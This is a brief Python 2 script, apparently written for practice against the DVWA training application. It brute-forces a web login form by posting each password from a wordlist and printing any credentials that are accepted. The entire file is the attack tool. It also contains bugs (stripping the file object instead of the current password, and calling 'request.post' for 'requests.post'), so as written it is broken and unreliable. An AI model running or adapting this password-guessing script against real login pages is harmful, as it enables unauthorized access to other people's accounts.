#!/usr/bin/python
# used to DVWA test
import requests


def bruteforce(username, url):
    for password in passwords:
        password = passwords.strip()
        print("[!!] Trying to bruteforce with passwords:  " + password)
        data_dictionary = {"username":username, "password":password, "login":"submit" } #name of inputs at html
        response = request.post(url, data=data_dictionary)
        if "Login failed" in response.content:
            pass
        else:
            print("[+] Username: --> " + username)
            print("[+] Password: --> " + password)
            exit()        


#find form at html source, inputs and his names and buttom to login
page_url = "http://192.168.1.5/dvwa/login.php" # Target url
username = raw_input("[*] Enter username for specified page: ")

with open("passlist.txt", "r") as passwords:
    bruteforce(username, page_url)

